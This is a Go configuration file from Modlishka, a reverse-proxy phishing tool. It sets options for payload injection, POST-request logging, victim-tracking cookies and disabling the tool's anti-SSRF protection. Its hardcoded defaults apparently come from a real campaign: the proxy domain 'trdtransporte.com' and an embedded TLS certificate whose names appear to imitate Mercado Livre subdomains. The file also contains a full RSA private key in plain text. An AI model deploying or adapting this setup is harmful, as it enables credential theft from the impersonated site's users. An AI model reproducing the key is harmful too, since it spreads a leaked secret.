/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package config

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"github.com/drk1wi/Modlishka/log"
	"io/ioutil"
	"os"
)

type Options struct {
	ProxyDomain          *string `json:"proxyDomain"`
	ListeningAddress     *string `json:"listeningAddress"`
	ListeningPortHTTP    *int    `json:"listeningPortHTTP"`
	ListeningPortHTTPS   *int    `json:"listeningPortHTTPS"`
	ProxyAddress     	 *string `json:"proxyAddress"`
	Target               *string `json:"target"`
	TargetRes            *string `json:"targetResources"`
	TargetRules          *string `json:"rules"`
	JsRules              *string `json:"jsRules"`
	TerminateTriggers    *string `json:"terminateTriggers"`
	TerminateRedirectUrl *string `json:"terminateRedirectUrl"`
	TrackingCookie       *string `json:"trackingCookie"`
	TrackingParam        *string `json:"trackingParam"`
	Debug                *bool   `json:"debug"`
	ForceHTTPS           *bool   `json:"forceHTTPS"`
	ForceHTTP            *bool   `json:"forceHTTP"`
	LogPostOnly          *bool   `json:"logPostOnly"`
	DisableSecurity      *bool   `json:"disableSecurity"`
	DynamicMode          *bool   `json:"dynamicMode"`
	LogRequestFile       *string `json:"log"`
	Plugins              *string `json:"plugins"`
	*TLSConfig
}

type TLSConfig struct {
	TLSCertificate *string `json:"cert"`
	TLSKey         *string `json:"certKey"`
	TLSPool        *string `json:"certPool"`
}

var (
	C = Options{
		ProxyDomain:      flag.String("proxyDomain", "trdtransporte.com", "Proxy domain name that will be used - e.g.: proxy.tld"),
		ListeningAddress: flag.String("listeningAddress", "127.0.0.1", "Listening address - e.g.: 0.0.0.0 "),
		ListeningPortHTTP: flag.Int("listeningPortHTTP", 80, "Listening port for HTTP requests"),
		ListeningPortHTTPS: flag.Int("listeningPortHTTPS", 443, "Listening port for HTTPS requests"),
		Target:           flag.String("target", "", "Target  domain name  - e.g.: target.tld"),
		TargetRes: flag.String("targetRes", "",
			"Comma separated list of domains that were not translated automatically. Use this to force domain translation - e.g.: static.target.tld"),
		TerminateTriggers: flag.String("terminateTriggers", "",
			"Session termination: Comma separated list of URLs from target's origin which will trigger session termination"),
		TerminateRedirectUrl: flag.String("terminateUrl", "",
			"URL to which a client will be redirected after Session Termination rules trigger"),
		TargetRules: flag.String("rules", "",
			"Comma separated list of 'string' patterns and their replacements - e.g.: base64(new):base64(old),"+
				"base64(newer):base64(older)"),
		JsRules: flag.String("jsRules", "", "Comma separated list of URL patterns and JS base64 encoded payloads that will be injected - e.g.: target.tld:base64(alert(1)),..,etc"),

		ProxyAddress: flag.String("proxyAddress", "", "Proxy that should be used (socks/https/http) - e.g.: http://127.0.0.1:8080 "),

		TrackingCookie: flag.String("trackingCookie", "id", "Name of the HTTP cookie used for track the client"),
		TrackingParam:  flag.String("trackingParam", "id", "Name of the HTTP parameter used to set up the HTTP cookie tracking of the client"),
		Debug:           flag.Bool("debug", false, "Print extra debug information"),
		DisableSecurity: flag.Bool("disableSecurity", false, "Disable proxy security features like anti-SSRF. 'Here be dragons' - disable at your own risk."),
		DynamicMode: flag.Bool("dynamicMode", false, "Enable dynamic mode for 'Client Domain Hooking'"),

		ForceHTTP:           flag.Bool("forceHTTP", false, "Strip all TLS from the traffic and proxy through HTTP only"),
		ForceHTTPS:           flag.Bool("forceHTTPS", false, "Strip all clear-text from the traffic and proxy through HTTPS only"),

		LogRequestFile: flag.String("log", "", "Local file to which fetched requests will be written (appended)"),

		LogPostOnly: flag.Bool("postOnly", false, "Log only HTTP POST requests"),

		Plugins: flag.String("plugins", "all", "Comma separated list of enabled plugin names"),
	}

	s = TLSConfig{
		TLSCertificate: flag.String("cert", "-----BEGIN CERTIFICATE-----\nMIIF5TCCBM2gAwIBAgISBGUcw0hpipO5UmeXNp5a6u2AMA0GCSqGSIb3DQEBCwUA\nMEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD\nExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0yMDExMTcxNjI1MTVaFw0y\nMTAyMTUxNjI1MTVaMB4xHDAaBgNVBAMMEyoudHJkdHJhbnNwb3J0ZS5jb20wggEi\nMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZSwdxDMmNQIKZyA2eGT9Kdqtz\nC4SbXz0oUqE3P5XXrMymY4baI0Sz5iFWKe4i2ls9hxKTWn0WAYTrjfzCikbIzdPW\nLmXnozi7AMCIhF5x1odIxYb3prdjnZt1d7WrDItAKI1LywQpIS8HFTHZ1Hvjvh43\nYQMkWlMElV968IaAZrD7PbFwETHPmGTilJmiI7ssofrhO7W7UGrVOtDu3QCPM7fR\nJKcYu89hUlA7fItICqUDUxiIw10N5KR4CcEmkSr1zptdsQOMvCi8NHJrWs65W9+E\nZBOgev7EHfX+kf8qBeXO3HY/eQEvCCj9ZMl0RZmBy9adlxpsKuR/33jMPTiLAgMB\nAAGjggLvMIIC6zAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEG\nCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0OBBYEFDQZBMPNmontKFsjAL41\nIPjOzEUOMB8GA1UdIwQYMBaAFKhKamMEfd265tE5t6ZFZe/zqOyhMG8GCCsGAQUF\nBwEBBGMwYTAuBggrBgEFBQcwAYYiaHR0cDovL29jc3AuaW50LXgzLmxldHNlbmNy\neXB0Lm9yZzAvBggrBgEFBQcwAoYjaHR0cDovL2NlcnQuaW50LXgzLmxldHNlbmNy\neXB0Lm9yZy8wgaQGA1UdEQSBnDCBmYIaKi5jb20uYnIudHJkdHJhbnNwb3J0ZS5j\nb22CFyouY29tLnRyZHRyYW5zcG9ydGUuY29tgicqLm1lcmNhZG9saXZyZS5jb20u\nYnIudHJkdHJhbnNwb3J0ZS5jb22CJCoubWVyY2Fkb2xpdnJlLmNvbS50cmR0cmFu\nc3BvcnRlLmNvbYITKi50cmR0cmFuc3BvcnRlLmNvbTBMBgNVHSAERTBDMAgGBmeB\nDAECATA3BgsrBgEEAYLfEwEBATAoMCYGCCsGAQUFBwIBFhpodHRwOi8vY3BzLmxl\ndHNlbmNyeXB0Lm9yZzCCAQQGCisGAQQB1nkCBAIEgfUEgfIA8AB2AESUZS6w7s6v\nxEAH2Kj+KMDa5oK+2MsxtT/TM5a1toGoAAABddc9O88AAAQDAEcwRQIhALqgE1B7\n9s7PrRlH92FM+FcfHgMzO634leVOr2S2O4h4AiBx4DdMtxfJLeDplMMT5FWK/MOM\naQLgoWewBpqBZLqvtwB2AH0+8viP/4hVaCTCwMqeUol5K8UOeAl/LmqXaJl+IvDX\nAAABddc9O/sAAAQDAEcwRQIgOrTKNRpaCGThU6CDkTGlpNAvLfb02j54oa0CZhOK\nsLYCIQCloF8emHmwAhjiNyHklj5Y6c62u38y1g+/tPVhEzZLtDANBgkqhkiG9w0B\nAQsFAAOCAQEAXmKF6nrVVa3RrathYY/Y0vHaczzxc8drYPV+IWaNMFhYmS9fTAOK\ncMmGMcavA58Mj22thDELsBZaLMtCmhXsc8PPj2jcDV4jjyiRiVdCSnVkRojIiGJg\nzju2zLnlg0jzwEuMEKNgCkRUIgVWdijTJzKL5uWl3KIZD7dBgSKr3dKWg94m5BaB\n+mWiB9hUqj+3EMpslJGZHYQmBLjQLGNbb+uI/cphWmMC2iCUOS1kLjQ3GsyDfLGZ\ntX3DOpPC95NgimavW1mNFxhkUY/KsfUETivFibIzDXkAYjCvZ3CUM+46J/3aQ3CH\nfV70bYS9e45kV7jj1GF+QaKBqVONFz6jTw==\n-----END CERTIFICATE-----\n", "base64 encoded TLS certificate"),
		TLSKey:         flag.String("certKey", "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAmUsHcQzJjUCCmcgNnhk/SnarcwuEm189KFKhNz+V16zMpmOG\n2iNEs+YhVinuItpbPYcSk1p9FgGE6438wopGyM3T1i5l56M4uwDAiIRecdaHSMWG\n96a3Y52bdXe1qwyLQCiNS8sEKSEvBxUx2dR7474eN2EDJFpTBJVfevCGgGaw+z2x\ncBExz5hk4pSZoiO7LKH64Tu1u1Bq1TrQ7t0AjzO30SSnGLvPYVJQO3yLSAqlA1MY\niMNdDeSkeAnBJpEq9c6bXbEDjLwovDRya1rOuVvfhGQToHr+xB31/pH/KgXlztx2\nP3kBLwgo/WTJdEWZgcvWnZcabCrkf994zD04iwIDAQABAoIBADQZfgP8NpxdaoXd\nqlMrfYlPX+IP7hfofJ6xxr1CTSkqP7vlY7XL+tOxyW7BfYA2+n+k4rlWLeFGzuhI\nL7nmyTwCSJco2dWqceOM0+MSKg9CvGQNTlvpO7cNoAKClyn1b3Z00eEKtPVNo/Ai\nUfkY8KpsuVRVEn5OfJy4L+VWzj/hIGZTP92LMml16ZtUx9eVq58h3Z56zpqL0gVW\niL5OIUR6RL0DsE67cN20N9nJVJkJrvl3z0Qp1iUVPtLuGS/yJLHBipEHNbfWX9Lg\nFRwjRc65SGXT1+kBC2Mcsd0oreYAfOJ9urgkiaje/Hm436/PQQt+sXtuFdzrqV74\nObYTMUECgYEAyML0mxjCRv5zCDYvm/UsMzsHw57qOv1QUQ1WBVmo/LauPIstIHyq\n/saaDM0POZZFCqodxydOV+wx9qwKaku1wWTgEffevXuQVBOo6K6EXg5QDnbtxQ9n\nI4DBkWZTnOWZbgPGKHcWAG0H0sxNXbybF2Fuj7n9HTICsdbNIw/X6FsCgYEAw3iJ\nYM7ZOiibClJaJpw9BzXgxo10wE59AKSx8sPbChdTYU6PFU37z1Ozw1+zvsLHU6bk\nuA+6Rk+EVtwxN/AJCHj6KgU8JAMaOhst9d0Dp7KegNEwXLd0Ng7KO+MsWa99d7xw\nDU6ouR2p8Ct3oDXrdUqX7VUdEORaplgMjrdCZ5ECgYAnK7q0JEGLvovNN11UraKB\nIGxkY7ZJ6jDoj5SQGK1bGX2nfHRCmXB3o2JdSwlEcChqa0TCHc4wY3pgKbMiiEEf\nScJaXyWLjPddIDTdqWdUPrCqEdRUlavHBpE+AFwiCb5E8+GO9aVKUfuryobx2iHc\njvsWefCD6MUT09hUlfvHbwKBgQCT2P3/7TS9Gq16NyPdBFvcslHbnG7sbfF6pRe7\niYyJq27zsNnkwWFvRd44LpDj/quJiDiDR9IbEFYG5PGNX89VSzvcwKzmiDo0LQ6s\nYok7NI1S3eb4mgIaSUGJ3qBTDbuW7z7Jse9IZTl+YUJQObhotQ0JBFHBzxcJrpuA\n7vgZIQKBgADahzBlFKF0w5cbDkJiYxlh1FeWQy3NFzgnPROXsd0I+jGHlqruiW6P\n37bf5NhRdGGT5dA2q9JJHvnXMrd1NeEf1LMtNfKPXwFMNkEE/OGdI7RmmCEiZrnl\nlXdN8CO+U6Bg3woNUYw7qYvXuu99cbKgV2jkNwNEWfSoX5nuTITs\n-----END RSA PRIVATE KEY-----\n", "base64 encoded TLS certificate key"),
		TLSPool:        flag.String("certPool", "\n-----BEGIN CERTIFICATE-----\nMIIEkjCCA3qgAwIBAgIQCgFBQgAAAVOFc2oLheynCDANBgkqhkiG9w0BAQsFADA/\nMSQwIgYDVQQKExtEaWdpdGFsIFNpZ25hdHVyZSBUcnVzdCBDby4xFzAVBgNVBAMT\nDkRTVCBSb290IENBIFgzMB4XDTE2MDMxNzE2NDA0NloXDTIxMDMxNzE2NDA0Nlow\nSjELMAkGA1UEBhMCVVMxFjAUBgNVBAoTDUxldCdzIEVuY3J5cHQxIzAhBgNVBAMT\nGkxldCdzIEVuY3J5cHQgQXV0aG9yaXR5IFgzMIIBIjANBgkqhkiG9w0BAQEFAAOC\nAQ8AMIIBCgKCAQEAnNMM8FrlLke3cl03g7NoYzDq1zUmGSXhvb418XCSL7e4S0EF\nq6meNQhY7LEqxGiHC6PjdeTm86dicbp5gWAf15Gan/PQeGdxyGkOlZHP/uaZ6WA8\nSMx+yk13EiSdRxta67nsHjcAHJyse6cF6s5K671B5TaYucv9bTyWaN8jKkKQDIZ0\nZ8h/pZq4UmEUEz9l6YKHy9v6Dlb2honzhT+Xhq+w3Brvaw2VFn3EK6BlspkENnWA\na6xK8xuQSXgvopZPKiAlKQTGdMDQMc2PMTiVFrqoM7hD8bEfwzB/onkxEz0tNvjj\n/PIzark5McWvxI0NHWQWM6r6hCm21AvA2H3DkwIDAQABo4IBfTCCAXkwEgYDVR0T\nAQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMCAYYwfwYIKwYBBQUHAQEEczBxMDIG\nCCsGAQUFBzABhiZodHRwOi8vaXNyZy50cnVzdGlkLm9jc3AuaWRlbnRydXN0LmNv\nbTA7BggrBgEFBQcwAoYvaHR0cDovL2FwcHMuaWRlbnRydXN0LmNvbS9yb290cy9k\nc3Ryb290Y2F4My5wN2MwHwYDVR0jBBgwFoAUxKexpHsscfrb4UuQdf/EFWCFiRAw\nVAYDVR0gBE0wSzAIBgZngQwBAgEwPwYLKwYBBAGC3xMBAQEwMDAuBggrBgEFBQcC\nARYiaHR0cDovL2Nwcy5yb290LXgxLmxldHNlbmNyeXB0Lm9yZzA8BgNVHR8ENTAz\nMDGgL6AthitodHRwOi8vY3JsLmlkZW50cnVzdC5jb20vRFNUUk9PVENBWDNDUkwu\nY3JsMB0GA1UdDgQWBBSoSmpjBH3duubRObemRWXv86jsoTANBgkqhkiG9w0BAQsF\nAAOCAQEA3TPXEfNjWDjdGBX7CVW+dla5cEilaUcne8IkCJLxWh9KEik3JHRRHGJo\nuM2VcGfl96S8TihRzZvoroed6ti6WqEBmtzw3Wodatg+VyOeph4EYpr/1wXKtx8/\nwApIvJSwtmVi4MFU5aMqrSDE6ea73Mj2tcMyo5jMd6jmeWUHK8so/joWUoHOUgwu\nX4Po1QYz+3dszkDqMp4fklxBwXRsW10KXzPMTZ+sOPAveyxindmjkW8lGy+QsRlG\nPfZ+G6Z6h7mjem0Y+iWlkYcV4PIWL1iwBi8saCbGS5jN2p8M+X+Q7UNKEkROb3N6\nKOqkqm57TH2H3eDJAkSnh6/DNFu0Qg==\n-----END CERTIFICATE-----\n", "base64 encoded Certification Authority certificate"),
	}

	JSONConfig = flag.String("config", "", "JSON configuration file. Convenient instead of using command line switches.")
)

func ParseConfiguration() Options {

	flag.Parse()

	// Parse JSON for config
	if len(*JSONConfig) > 0 {
		C.parseJSON(*JSONConfig)
	}

	// Process TLS configuration
	C.TLSConfig = &s

	// we can assume that if someone specified one of the following cmd line parameters then he should define all of them.
	if len(*s.TLSCertificate) > 0 || len(*s.TLSKey) > 0 || len(*s.TLSPool) > 0 {

		// Handle TLS Certificates
		if *C.ForceHTTP == false {
			if len(*C.TLSCertificate) > 0 {
				decodedCertificate, err := base64.StdEncoding.DecodeString(*C.TLSCertificate)
				if err == nil {
					*C.TLSCertificate = string(decodedCertificate)

				}
			}

			if len(*C.TLSKey) > 0 {
				decodedCertificateKey, err := base64.StdEncoding.DecodeString(*C.TLSKey)
				if err == nil {
					*C.TLSKey = string(decodedCertificateKey)
				}
			}

			if len(*C.TLSPool) > 0 {
				decodedCertificatePool, err := base64.StdEncoding.DecodeString(*C.TLSPool)
				if err == nil {
					*C.TLSPool = string(decodedCertificatePool)
				}
			}
		}

	}


	return C
}

func (c *Options) parseJSON(file string) {

	ct, err := os.Open(file)
	defer ct.Close()
	if err != nil {
		log.Fatalf("Error opening JSON configuration (%s): %s . Terminating.", file, err)
	}

	ctb, _ := ioutil.ReadAll(ct)
	err = json.Unmarshal(ctb, &c)
	if err != nil {
		log.Fatalf("Error unmarshalling JSON configuration (%s): %s . Terminating.", file, err)
	}

	err = json.Unmarshal(ctb, &s)
	if err != nil {
		log.Fatalf("Error unmarshalling JSON configuration (%s): %s . Terminating.", file, err)
	}

	C.TLSConfig = &s

}

func (c *Options) VerifyConfiguration() {

	if *c.ForceHTTP == true {
		if len(*c.ProxyDomain) == 0 || len(*c.ProxyDomain) == 0 {
			log.Warningf("Missing required parameters in oder start the proxy. Terminating.")
			log.Warningf("TIP: You will need to specify at least the following parameters to serve the page over HTTP: proxyDomain and target.")
			flag.PrintDefaults()
			os.Exit(1)
		}
	} else { 	// default + HTTPS wrapper

			if len(*c.ProxyDomain) == 0 || len(*c.ProxyDomain) == 0 {
				log.Warningf("Missing required parameters in oder start the proxy. Terminating.")
				log.Warningf("TIP: You will need to specify at least the following parameters to serve the page over HTTP: proxyDomain and target.")
				flag.PrintDefaults()
				os.Exit(1)
			}


	}


	if *c.DynamicMode == true {
		log.Warningf("Dynamic Mode enabled: Proxy will accept and hook all incoming HTTP requests.")
	}


	if *c.ForceHTTP == true {
		log.Warningf("Force HTTP wrapper enabled: Proxy will strip all TLS traffic and handle requests over HTTP only")
	}

	if *c.ForceHTTPS == true {
		log.Warningf("Force HTTPS wrapper enabled: Proxy will strip all clear-text traffic and handle requests over HTTPS only")
	}

}
